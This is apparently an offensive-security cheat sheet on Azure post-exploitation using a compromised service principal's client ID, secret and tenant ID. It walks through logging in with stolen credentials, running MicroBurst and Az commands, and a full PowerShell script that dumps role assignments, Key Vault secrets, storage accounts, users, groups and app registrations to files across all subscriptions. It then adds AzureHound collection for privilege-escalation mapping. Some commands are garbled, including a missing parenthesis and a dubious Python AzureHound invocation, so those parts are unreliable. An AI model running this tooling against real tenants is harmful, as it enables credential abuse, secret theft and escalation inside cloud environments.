# Service principal

## Enumeration using service principal credentials

Enumerating permissions and assets in Azure after compromising a **Service Principal (SP)** credential set, which includes:

- Client ID
- Client Secret
- Tenant ID

We can use **MicroBurst**, **Azure PowerShell**, or **Az CLI** to cover various vectors of enumeration.

------------------------------------------------------------------------

### Setup

Install Azure PowerShell

    Install-Module -Name Az -AllowClobber -Scope CurrentUser

Install MicroBurst

    git clone https://github.com/NetSPI/MicroBurst.git
    cd MicroBurst

------------------------------------------------------------------------

### Authenticate with SP Credentials 🔐

Azure PowerShell

    \$clientId = "\<client-id\>"

    \$clientSecret = "\<client-secret\>"

    \$tenantId = "\<tenant-id\>"

    \$secureSecret = ConvertTo-SecureString \$clientSecret -AsPlainText -Force

    \$creds = New-Object System.Management.Automation.PSCredential(\$clientId, \$secureSecret

    Connect-AzAccount -ServicePrincipal -Credential \$creds -Tenant \$tenantId

AZ CLI

    az login --service-principal -u \<client-id\> -p \<client-secret\> --tenant \<tenant-id\>

------------------------------------------------------------------------

### Enumeration Steps

Import MicroBurst

    Import-Module .\MicroBurst\MicroBurst.psm1

List Subscriptions

    Get-AzSubscription

    Set-AzContext -Subscription <subscription_id>

🔄 Use Set-AzContext -Subscription \<id\> to change context if needed.

------------------------------------------------------------------------

Enumerate Roles and Access

    Get-AzRoleAssignment
    
    Get-AzRoleDefinition

Find Key Vaults and Secrets

    Get-AzKeyVault \# List accessible vaults

    Get-AzKeyVaultSecret -VaultName \<name\> \# Dump secrets (if allowed)

Enumerate Storage Accounts & Files

    Get-AzStorageAccount

    Invoke-EnumerateAzureBlobs -Verbose \# From MicroBurst

Enumerate App Registrations / Service Principals**

    Get-AzADApplication

    Get-AzADServicePrincipal

Enumerate Users and Groups**

    Get-AzADUser

    Get-AzADGroup

Enumerate external assets via DNS

    Invoke-EnumerateAzureSubDomains — Enum external assets via DNS

All in one enumeration script

    Invoke-EnumerateAzureRM — All-in-one enumeration script

Collect Microsoft Entra details for Bloodhound analysis (for privilege escalation paths)

    AzureHound

------------------------------------------------------------------------

In Az CLI

    az account list

    az role assignment list

    az keyvault list

    az keyvault secret list --vault-name \<vault\>

    az storage account list

------------------------------------------------------------------------
------------------------------------------------------------------------
PowerShell script to automate Azure post-exploitation tasks using compromised Service Principal credentials.
It includes:

- SPN authentication
- Core enumeration
- Optional AzureHound data collection

`\# Azure-SPN-Enum.ps1`

    param (
    \[Parameter(Mandatory=\$true)\]\[string\]\$ClientId,
    \[Parameter(Mandatory=\$true)\]\[string\]\$ClientSecret,
    \[Parameter(Mandatory=\$true)\]\[string\]\$TenantId
    )

    \# Convert client secret to secure string
    \$secureSecret = ConvertTo-SecureString \$ClientSecret -AsPlainText -Force
    \$creds = New-Object
    System.Management.Automation.PSCredential(\$ClientId, \$secureSecret)

    \# Connect to Azure
    Write-Host "\`n\[+\] Authenticating as Service Principal..."
    Connect-AzAccount -ServicePrincipal -Credential \$creds -Tenant \$TenantId \| Out-Null

    \# List Subscriptions
    Write-Host "\[+\] Enumerating subscriptions..."
    Get-AzSubscription \| Tee-Object -FilePath "subscriptions.txt"

    \# Set active subscription
    \$subs = Get-AzSubscription
    foreach (\$sub in \$subs) {
    Write-Host "\`n\[\>\] Switching to Subscription: \$(\$sub.Name)"
    Set-AzContext -SubscriptionId \$sub.Id \| Out-Null

    \# Role Assignments
    Write-Host "\[\*\] Roles and permissions..."
    Get-AzRoleAssignment \| Tee-Object -FilePath "roles\_\$(\$sub.Name).txt"

    \# Key Vaults & Secrets
    Write-Host "\[\*\] Key Vault secrets (if accessible)..."
    Get-AzKeyVault \| ForEach-Object {
    try {
    Get-AzKeyVaultSecret -VaultName \$\_.VaultName \| Tee-Object -FilePath
    "kv\_\$(\$\_.VaultName).txt"
    } catch {
    Write-Warning "Access denied to vault: \$(\$\_.VaultName)"
    }

    }

    \# Storage
    Write-Host "\[\*\] Storage accounts..."
    Get-AzStorageAccount \| Tee-Object -FilePath
    "storage\_\$(\$sub.Name).txt"

    \# Azure AD Users and Groups
    Write-Host "\[\*\] Azure AD enumeration..."
    Get-AzADUser \| Tee-Object -FilePath "users\_\$(\$sub.Name).txt"
    Get-AzADGroup \| Tee-Object -FilePath "groups\_\$(\$sub.Name).txt"

    \# App Registrations
    Write-Host "\[\*\] App registrations..."
    Get-AzADApplication \| Tee-Object -FilePath "apps\_\$(\$sub.Name).txt"
    }
    Write-Host "\`n\[+\] Enumeration complete. Logs saved in current directory."

### Collect AzureHound Data (Optional)

    Install and run [AzureHound](https://github.com/BloodHoundAD/AzureHound) from a Linux host:

Install dependencies (Python 3.8+, pip)

    pip install -r requirements.txt

Collect data with SP creds

    python3 AzureHound.py azure --client-id \<id\> --client-secret \<secret\> --tenant-id \<id\> --output-file azure.zip

Upload azure.zip to BloodHound GUI for graph-based privilege escalation analysis.